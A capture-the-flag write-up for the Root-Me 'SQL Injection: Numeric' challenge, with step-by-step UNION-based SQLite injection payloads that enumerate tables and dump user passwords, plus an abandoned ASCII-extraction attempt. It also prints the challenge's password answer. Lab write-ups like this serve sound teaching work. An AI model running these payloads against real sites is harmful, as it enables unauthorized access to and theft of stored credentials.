# [SQL Injection: Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-numeric)

This is a similar news article site as the "SQL Injection: String" challenge. But since this 
one is called "Numeric", I bet the vulnerability lies in the GET parameter `news_id`

So if we try: `?action=news&news_id=2-1` it resolves to the first article so we know we can 
inject here.

So we should be able to show all articles with `news_id=1 or 1=1--`

And we can! Let's see how many columns we are getting back with `order by`

`news_id=1 order by 1--`

And `order by 4` returns an error, so we know the query is returning 3 columns.

Let's see the table names:

`news_id=1 union select 1,name,3 from sqlite_master where type='table'--`

We get an error... Doesn't look like we can include single-quotes in our query.

`news_id=1 union select 1,tbl_name,3 from sqlite_master--`

Ok so two tables: "users" and "news"

`news_id=1 union select 1,sql,3 from sqlite_master--`

"users" has three columns: "username","password" and "year"

`news_id=1 union select 1,username,password from users--`

There's our password.

Password is: **aTlkJYLjcbLmue3**

*Read below when I thought we could only return integers(doh)... Still 
not sure how my ascii iteration didn't work. The admin password was off for 
a couple characters...Strange.*


Let's see what data type each column has.

`news_id=1 union select 'a',null,null--` returns an error

`news_id=1 union select 1,null,null--` works! So the first column is an integer.

`news_id=1 union select 1,'a',null--` returns an error

`news_id=1 union select 1,2,null--` works! So the second column is an integer.

`news_id=1 union select 1,2,'a'--` returns an error

`news_id=1 union select 1,2,3--` works! So each column is an integer.

This makes it difficult to directly extract text information from the database like 
usernames and passwords. But SQLite does have a `unicode()` function that will return the 
ascii value of the first character of a string so we could combine that with the `substr()`
function to extract two characters at a time.

`news_id=1 union select 1,unicode(substr(password,1,1)),unicode(substr(password,2,1)) from users where username='admin'--`

We get an error that looks like our single quotes are being escaped. So we can't explicitly call out the admin user 
by name. Let's just see how many users there are.

`news_id=1 union select 1,count(*),3 from users--`

There are 3 users. We can just hope the first user is the admin and if not there's only two more to try so let's do this.

`news_id=1 union select 1,unicode(substr(password,1,1)),unicode(substr(password,2,1)) from users limit 1--`

And we'll work our way up the password collecting ASCII values:

`97 70 106 82 74 89 55 106 57 100`

We could have wrote a script to do that but I was hoping the password was short and it was. It took us five queries to 
get the ASCII values of the ten character password. Take this over to an online converter and bam!

The password is *aFjRJY7j9d*

But that was wrong... Crap we must have gotten the wrong user. Let's try the next one.

`news_id=1 union select 1,unicode(substr(password,1,1)),unicode(substr(password,2,1)) from users limit 1,1--`

`97 84 108 107 75 120 76 106 84 88 76 109 117 101 51`

Let's try this pass: *aTlkKxLjTXLmue3*

Wrong again! Of course it had to be the last user we tried... isn't that how it always is?

`news_id=1 union select 1,unicode(substr(password,1,1)),unicode(substr(password,2,1)) from users limit 2,1--`

`118 85 114 112 103 65 115 67 99 98`

Last try: *vUrpgAsCcb*

That didn't work either... What am i missing?











